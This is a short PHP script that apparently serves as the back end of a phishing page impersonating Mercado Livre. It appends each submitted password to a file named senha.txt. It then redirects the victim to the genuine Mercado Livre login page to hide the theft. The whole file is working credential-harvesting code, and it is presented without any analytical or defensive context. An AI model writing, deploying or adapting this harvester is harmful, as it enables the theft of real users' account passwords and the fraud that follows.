<?php

file_put_contents("senha.txt", "Senha: " . $_POST['password']  . "\n", FILE_APPEND);
header('Location: https://www.mercadolivre.com/jms/mlb/lgz/msl/login/');
exit();
